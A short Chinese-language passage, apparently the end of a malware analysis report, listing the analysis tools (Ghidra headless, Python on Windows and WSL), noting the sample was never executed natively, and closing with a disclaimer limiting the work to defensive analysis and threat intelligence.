- Ghidra 12.2 PUBLIC（headless，Java GhidraScript）；
- Python 3.9（Windows）/ Python 3（WSL venv）；
- 样本全程未原生执行。

---

> **免责声明**：本文仅用于防御性安全分析、检测规则编写和威胁情报共享。请勿在非隔离环境运行任何恶意样本。
